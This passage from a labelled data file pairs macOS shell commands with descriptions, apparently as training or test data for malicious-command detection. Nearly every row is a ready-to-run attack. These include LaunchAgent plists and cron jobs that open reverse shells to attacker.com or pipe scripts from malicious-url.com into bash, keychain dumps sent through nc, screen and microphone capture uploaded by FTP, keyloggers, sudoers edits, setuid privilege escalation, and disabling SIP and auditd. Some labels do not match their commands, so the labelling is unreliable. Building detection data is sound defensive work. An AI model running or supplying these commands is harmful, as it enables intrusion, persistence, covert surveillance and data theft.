</plist>' > ~/Library/LaunchAgents/com.malicious.packetpeeper.plist && launchctl load ~/Library/LaunchAgents/com.malicious.packetpeeper.plist","Persistence via malicious plist that captures network traffic using Packet Peeper."
"0 * * * * /usr/bin/curl http://malicious-url.com/script.sh | /bin/bash","Persistence via malicious cron job that downloads and executes a script every hour."
"sudo tcpdump -i any port 80 -w captured_traffic.pcap","Malicious command for network traffic sniffing using tcpdump to capture all traffic on port 80."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence of a keylogger on macOS through Launch Agents."
"curl -s http://malicious-website.com/installer.sh | sh","Malware installation through a drive-by download initiated by visiting a malicious website."
"cp /usr/bin/env /tmp/; chmod u+s /tmp/env; DYLD_INSERT_LIBRARIES=./malicious.dylib /tmp/env","Privilege escalation by exploiting a setuid binary to execute a malicious payload."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist file to establish a reverse shell connection."
"ps aux | grep '\s\['","Listing all processes including those without controlling terminals to identify hidden processes."
"cp /usr/bin/sleep ~/Library/.hidden && ~/Library/.hidden 300 &","Creating a process that disguises itself by mimicking a common system process name."
"nohup ./malicious_script.sh >/dev/null 2>&1 &","Launching a process in the background that does not appear in the dock or force quit applications list."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation through a disguised script downloaded from the internet."
"echo 'echo ""while :; do nc -l 4444 -e /bin/sh; done"" & disown' >> ~/.bash_profile","Embedding a rootkit to maintain unauthorized access to the system."
"csrutil disable","Bypassing System Integrity Protection to alter protected system files."
"hdiutil attach -owners on /Volumes/Recovery\ HD/com.apple.recovery.boot/BaseSystem.dmg && cd /Volumes/OS\ X\ Base\ System && mv System System_original && cp -rp /System System","Making unauthorized changes to the recovery partition."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist file that executes a script every login."
"curl -s http://malicious-url.com/fakeupdate.sh | bash","Malware installation through a disguised Bash script that appears to be a software update."
"osascript -e 'do shell script ""launchctl unload /System/Library/LaunchDaemons/com.apple.windowserver.plist && launchctl load /path/to/malicious.plist"" with administrator privileges'","Privilege escalation by injecting code into a system daemon to execute a malicious payload."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious_script.sh</string>
		<string>http://malicious-url.com/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Persistence via malicious plist to load a daemon service on macOS."
"osascript -e 'tell application ""Terminal"" to do script ""curl -s http://malicious-url.com/payload.sh | sh""'","Malware installation through a malicious payload received via email and executed by exploiting vulnerabilities in the mail client."
"sudo kextload /Library/Extensions/malicious.kext","Persistence via a malicious kernel extension loaded without user consent."
"profiles -I -F /path/to/malicious.mobileconfig","Installation of a malicious configuration profile to change system settings."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Creating a launch agent for a reverse shell to maintain access."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item by adding a malicious application to the user's login items."
"echo '0 0 * * 1 /usr/bin/script -q /dev/null | nc attacker.com 4444' | crontab -","Establishing a cron job to monitor user activity every week and send the data to a remote server."
"curl -s http://malicious-ad.com/popunder_install.sh | sh","Installation of malware through a drive-by download initiated by malicious advertising scripts embedded in pop-under ads."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-L</string>
		<string>http://attacker.com/malware</string>
		<string>-o</string>
		<string>/tmp/backdoor</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to maintain remote access."
"TF=$(mktemp -u); echo '#!/bin/sh' > $TF; echo 'chmod 04755 /bin/bash' >> $TF; chmod +x $TF; cp $TF /tmp/overwrite; /usr/local/bin/suidbinary","Privilege escalation by exploiting a vulnerable setuid application on macOS."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/HiddenApp.app"", hidden:true}'","Persistence via login item by adding a hidden application to the user's login items."
"ssh -f -N -T -R 2222:localhost:22 malicious_user@attacker_server.com","Persistence via SSH tunneling to maintain unauthorized remote access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/tmp/keylog.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to capture user input."
"while true; do pbpaste | grep -i 'password\|credit\|ssn' >> ~/Library/Logs/clipboard.log; sleep 10; done","Monitoring clipboard contents for sensitive data."
"curl -s http://compromised-website.com/malicious-script.sh | sh","Malware installation through a drive-by download from a compromised website exploiting SQL injection vulnerabilities."
"*/5 * * * * screencapture -x ~/Desktop/screenshot-$(date +\""%Y-%m-%d-%H%M%S\"").png","Capturing screenshots every five minutes to monitor user activity."
"echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations where the sudoers file is writable by a group allowing unauthorized modifications."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.apple.softwareupdate</string>
	<key>ProgramArguments</key>
	<array>
		<string>/tmp/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.softwareupdate.plist && chmod 644 ~/Library/LaunchAgents/com.apple.softwareupdate.plist && launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist","Persistence via malicious plist impersonating a system daemon"
"while :; do openssl rand -base64 1000000 > /dev/null; done","Malicious command to create a CPU hog process by repeatedly executing a resource-intensive operation."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.hidden.process</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/env</string>
		<string>sh</string>
		<string>-c</string>
		<string>while :; do nohup /path/to/malicious/executable > /dev/null 2>&1 & disown; sleep 300; done</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.hidden.process.plist && launchctl load ~/Library/LaunchAgents/com.hidden.process.plist","Persistence via malicious plist to hide process and maintain memory-based execution."
"sudo tcpdump -i any -w ~/Desktop/CapturedTraffic.pcap","Intercepting network traffic to capture sensitive data on a macOS system."
"echo 'nameserver 192.168.1.100' > /etc/resolver/malicious && networksetup -setdnsservers Wi-Fi 192.168.1.100","Redirecting DNS requests to a malicious server to perform DNS spoofing."
"sudo pfctl -f /etc/pf.conf && echo 'rdr pass on en0 inet proto tcp to any port {80, 443} -> 192.168.1.100 port 8080' | sudo pfctl -ef -","Creating a persistent traffic redirection on a macOS system using iptables."
"sudo tcpdump -i en0 -w unauthorized_capture.pcap","Capturing network packets for analysis without authorization."
"find ~/Documents/Sensitive -type f -exec rar a -v10M -R ~/exfiltration/sensitive_documents.rar {} \;","Compressing sensitive documents in the user's home directory into multi-volume RAR archives for exfiltration."
"curl -o ~/Library/ApplicationSupport/Google/Chrome/NativeMessagingHosts/helper.sh http://malicious-url.com/chrome_exploit.sh && chmod +x ~/Library/ApplicationSupport/Google/Chrome/NativeMessagingHosts/helper.sh && ~/Library/ApplicationSupport/Google/Chrome/NativeMessagingHosts/helper.sh","Malware installation via a drive-by download exploiting a Chrome zero-day vulnerability on macOS."
"osascript -e 'do shell script ""echo \""launchctl setenv DYLD_INSERT_LIBRARIES /path/to/malicious.dylib\"" >> /etc/sudoers.d/env_keep"" with administrator privileges'","Privilege escalation by injecting code into a privileged process on macOS."
"while true; do screencapture -x ~/Desktop/capture.png; curl -T ~/Desktop/capture.png ftp://attacker.com/uploads/ --silent; sleep 300; done","Establishing remote access on a macOS system to capture the screen periodically and send the images to a remote server."
"while :; do ffmpeg -f avfoundation -i "":0"" -t 300 ~/Desktop/audio_capture.mp3; curl --upload-file ~/Desktop/audio_capture.mp3 ftp://attacker.com/uploads/; sleep 300; done","Setting up a macOS system to record audio from the microphone and upload the recording to a remote location."
"touch -a -mt 202301010000 /path/to/file","Maliciously altering file access timestamps to obfuscate the time of access."
"echo '*/5 * * * * /usr/bin/python /tmp/rootscript.py' >> /etc/crontab","Privilege escalation by injecting a script into a system-wide cron directory to run as root."
"find / -type f -perm -4000 -exec ls -ldb {} \;","Locating setuid scripts that can be exploited for root access."
"echo 'int main() { setuid(0); system(""/bin/bash""); return 0; }' > exploit.c && gcc exploit.c -o exploit && chmod u+s exploit && ./exploit","Executing a command as root by exploiting a vulnerable setuid script."
"while true; do pbpaste > /tmp/clipboard.log; sleep 10; done & echo 'while [ 1 ]; do cat /dev/input/event0 > /tmp/keystroke.log; done &' >> ~/.bash_profile","Persistence mechanism to monitor clipboard data and log keystrokes on a macOS system."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item manipulation using AppleScript to open a malicious application at login."
"find / -name '.*' -type f -exec grep -l 'confidential' {} \; | xargs tar -czf hidden_confidentials.tar.gz && mail -s 'Confidential Data' -A hidden_confidentials.tar.gz recipient@example.com < /dev/null","Detection of a script that emails confidential information from hidden files on a macOS system."
"sudo cp -a com.malicious.extension.kext /Library/Extensions/ && sudo chown -R root:wheel /Library/Extensions/com.malicious.extension.kext && sudo kextload /Library/Extensions/com.malicious.extension.kext","Persistence via malicious kernel extension loaded at boot time."
"osascript -e 'do shell script ""bash -i >& /dev/tcp/attacker.com/4444 0>&1""'","Remote access achieved by executing a script hidden within an email attachment."
"chmod +x ~/Downloads/malicious.jpg; ~/Downloads/malicious.jpg","Remote code execution by exploiting a downloaded image file that contains a malicious payload."
"hdiutil attach -nobrowse ~/Downloads/suspicious_document.dmg && ./.Volume/malicious_script","Malware-infected email attachments obfuscated as a regular document but executing a payload when opened."
"echo '*/30 * * * * /usr/bin/python /tmp/evil.py' | sudo crontab -","Privilege escalation by injecting malicious code into a system daemon plist file for execution via cron."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious_script.sh</string>
		<string>http://malicious-url.com/script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file injected into Launch Agents."
"find ~/Documents -name '*.doc' -exec bzip2 -zk {} \; -exec curl -T {}.bz2 ftp://attacker-server.com/upload/ --user username:password \;","Automatic transmission of documents from a macOS system using data compression methods for exfiltration with bzip2 reduction."
"sudo tshark -i any -q -w /tmp/capture.pcap &>/dev/null &","Capturing network traffic silently on a macOS system using tshark without the user's knowledge."
"echo ""*/5 * * * * /usr/bin/env bash -c 'curl -fsSL http://malicious-url.com/script.sh | /bin/bash'"" | crontab -","Persistence through modification of the user's crontab to execute a script every 5 minutes."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys","Persistence via SSH by adding public key to authorized_keys for backdoor access."
"ssh -N -f -L local_port:localhost:remote_port user@victim.com","Establishing an SSH tunnel for secure data exfiltration."
"tar czf - /path/to/sensitive/data | ssh user@victim.com 'cat > /path/to/destination/data.tar.gz'","Exfiltrating data over SSH tunnel using tar and gzip for compression."
"ssh user@victim.com 'cat /path/to/encrypted/payload' | openssl enc -d -aes-256-cbc -pass pass:decr1ptP@ss | bash","Executing an encrypted payload retrieved over SSH."
"while true; do for i in $(seq 1 10000); do echo 'username' 'password'${i} | /usr/bin/nc vpn.example.com 1723; done; sleep 300; done","Persistence through remote access by exploiting unpatched VPN services with brute force attacks on VPN accounts."
"cp /usr/bin/env /tmp/; echo 'echo ""malicious code""' > /tmp/env; chmod u+s /tmp/env","Injecting malicious code into a setuid executable due to weak file permissions."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3...' >> ~/.ssh/authorized_keys","Inserting malicious SSH keys into authorized_keys for unauthorized access."
"echo 'malicious.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...' > ~/.ssh/known_hosts","Altering known_hosts file to redirect SSH connections to a malicious server."
"echo 'Host *\n StrictHostKeyChecking no\n UserKnownHostsFile=/dev/null' >> ~/.ssh/config","Modifying the SSH configuration to disable host key verification."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/command.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>3600</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.daemon.plist && launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist","Persistence via a launch daemon that executes a script every hour to check for a remote command."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via cron job to download and execute a script every hour."
"while true; do screencapture -x ~/Desktop/screenshot-$(date +%Y%m%d%H%M%S).png; sleep 60; done","Capturing screenshots of user activity across applications on macOS."
"while read -r line; do curl -X POST -d @$line http://malicious-server.com/logkeys; done < /dev/input/event0","Capturing keystrokes on macOS and sending them to a remote server."
"curl -s http://malicious-url.com/installer.sh | sh","Malware installation via drive-by download initiated by a user clicking on a link in a phishing email."
"chmod +s /usr/local/bin/misconfigured-script.sh","Privilege escalation by exploiting misconfigured file permissions to execute a script with root privileges."
"sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.auditd.plist","Disabling file access auditing to prevent detection of unauthorized file operations."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo EDITOR='tee -a' visudo","Modifying the sudoers file to grant admin privileges without requiring a password."
"echo 'python -c ""import sys, time; f=open('/tmp/.logkeys', 'a'); while True: k=sys.stdin.read(1); f.write(k); f.flush(); time.sleep(0.01);""' >> ~/.bash_profile","Capturing user keystrokes by appending a script to .bash_profile that logs keys."
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","Persistence via cron job to download and execute a script every hour."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain access to a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist to maintain remote access"
"mv /usr/bin/fs_usage /usr/bin/fs_usage_original && touch /usr/bin/fs_usage && chmod +x /usr/bin/fs_usage && echo '#!/bin/bash' > /usr/bin/fs_usage && echo 'echo fs_usage tool is currently unavailable.' >> /usr/bin/fs_usage","Detection of unauthorized modification of the fs_usage tool to hide file system activity."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on boot."
"osascript -e 'do shell script ""<malicious_code>"" with administrator privileges'","Injecting code into a privileged process to escalate privileges on a macOS system."
"TF=$(mktemp -u); echo '#!/bin/sh' > $TF; echo '/bin/sh' >> $TF; chmod +x $TF; export PATH=/path/to/malicious:$PATH; /path/to/setuid/binary","Privilege escalation by exploiting a setuid-enabled binary that does not sanitize environment variables."
"0 * * * * zip -r /tmp/sensitive_data.zip ~/Documents/Sensitive && curl -T /tmp/sensitive_data.zip ftp://attacker.com/uploads/","A cron job is set up to compress and exfiltrate sensitive files from a macOS system every hour."
"mkdir ~/.hidden && curl -o ~/.hidden/hidden_executable http://malicious-url.com/payload && chmod +x ~/.hidden/hidden_executable && defaults write ~/Library/LaunchAgents/com.hidden.agent.plist ProgramArguments -array-add ~/.hidden/hidden_executable && launchctl load ~/Library/LaunchAgents/com.hidden.agent.plist","Persistence via hidden launch agent that executes a file from a hidden directory."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo EDITOR='tee -a' visudo","Altering the sudoers file to grant admin privileges without requiring a password."
"*/1 * * * * /bin/bash -c ""$(curl -fsSL http://malicious-url.com/script.sh)""","Persistence via cron job by editing crontab entries to execute a script from a remote server every minute."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:true}'","Persistence via login item that executes a hidden script on user login."
"while :; do screencapture -x ~/Library/Caches/$(date +%s).png; sleep 300; done","Automated screen capture on macOS for data exfiltration."
"echo ""* * * * * screencapture -x ~/Library/Caches/$(date +\""%Y%m%d%H%M%S\"").png"" | crontab -","Scheduled screen capture using cron job on macOS."
"nc -l 1337 | while read trigger; do if [ ""$trigger"" = ""capture"" ]; then screencapture -x ~/Library/Caches/$(date +%s).png; fi; done","Remote trigger activation for screen capture on macOS."
"echo 'int putenv(){return 0;}' > getenv.c && gcc -dynamiclib -o getenv.dylib getenv.c && chmod 755 getenv.dylib && export DYLD_INSERT_LIBRARIES=./getenv.dylib && /path/to/setuid/binary","Privilege escalation by abusing setuid binaries and modifying environment variables for setuid exploitation."
"TF=$(mktemp) && echo 'ALL ALL=(ALL) NOPASSWD: ALL' > $TF && sudoedit -s $TF","Exploiting sudoedit to escalate privileges due to the -s flag vulnerability."
"cp /usr/bin/env ./env && chmod u+s ./env && ./env /bin/sh -p","Injecting code into a privileged process using a setuid binary to escalate privileges."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file that keeps a reverse shell active."
"curl -s http://malicious-url.com/fake-update.pkg > /tmp/fake-update.pkg && installer -pkg /tmp/fake-update.pkg -target /","Malware installation through a trojan application disguised as a legitimate software update."
"osascript -e 'tell app ""Safari"" to set URL of front document to ""http://malicious-url.com/spoofed-login.html""'","Phishing attack vector using a spoofed login page to capture user credentials."
"echo '*/5 * * * * /usr/bin/env bash -i >& /dev/tcp/attacker.com/4444 0>&1' | sudo crontab -","Privilege escalation by appending a malicious script to root's crontab."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.trojan</string><key>ProgramArguments</key><array><string>/Applications/TrojanApp.app/Contents/MacOS/TrojanApp</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.trojan.plist && launchctl load ~/Library/LaunchAgents/com.malicious.trojan.plist","Persistence via malicious plist to launch a trojan application at login."
"security find-generic-password -wa '*' | nc attacker.com 4444","Credential harvesting script that extracts login items and sends them to a remote server."
"osascript -e 'tell application ""Contacts""' -e 'set thePeople to every person' -e 'repeat with i from 1 to count of thePeople' -e 'set thisPerson to item i of thePeople' -e 'set theEmail to value of first email of thisPerson' -e 'if theEmail is not missing value then' -e 'do shell script ""echo "" & theEmail & "" >> ~/Desktop/emails.txt""' -e 'end if' -e 'end repeat' -e 'end tell'","Email scraping from the macOS Contacts app for targeted phishing attacks."
"sudo kextload /Library/Extensions/malicious_extension.kext","Persistence via a malicious kernel extension loaded at boot time."
"sudo osascript -e 'do shell script ""sudo launchctl load /Library/LaunchDaemons/com.malicious.keylogger.plist"" with administrator privileges'","Establishing a system hook to monitor user keystrokes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.daemon</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-fsSL</string>
 <string>http://malicious-url.com/execute.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>StartInterval</key>
 <integer>300</integer>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Creating a launch daemon to execute a script periodically."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/HiddenApp.app"", hidden:true}'","Persistence via login item by adding a hidden application to the user's login items."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.loginitem</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/osascript</string>
		<string>-e</string>
		<string>do shell script ""curl http://malicious-url.com/remote_code.sh | sh""</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.loginitem.plist && launchctl load ~/Library/LaunchAgents/com.malicious.loginitem.plist","Persistence via malicious plist to execute remote code upon user login."
"Persistence via cron job to exfiltrate documents by email.","Automatic exfiltration of documents from a macOS system using a scheduled cron job that attaches documents to an email."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist in launchd to establish a reverse shell on system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.plist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/path/to/malicious/bufferoverflow</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to execute a buffer overflow attack on macOS."
"echo ""*/5 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash"" | crontab -","Persistence via crontab to execute a script every 5 minutes."
"echo ""*/30 * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/script.sh)\"""" | crontab -","Persistence establishment by adding a cron job to periodically download and execute a script from a remote server."
"grep 'authentication failure' /var/log/auth.log > /tmp/failed_login_attempts.txt","Tracking user authentication events by monitoring the system logs for failed login attempts."
"ps axo pid,ppid,pcpu,pmem,comm | grep -v grep | grep '\.\/'","Identifying hidden processes by altering the ps command output format to avoid detection."
"Persistence via malicious plist after opening a phishing email attachment.","Infiltration of a macOS system via a phishing email attachment that executes a ransomware payload when opened."
"curl -s http://malicious-url.com/ransomware_payload -o ~/Library/LaunchAgents/com.malicious.ransomware.plist && launchctl load ~/Library/LaunchAgents/com.malicious.ransomware.plist","The plist file is configured to download and execute the ransomware payload from a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
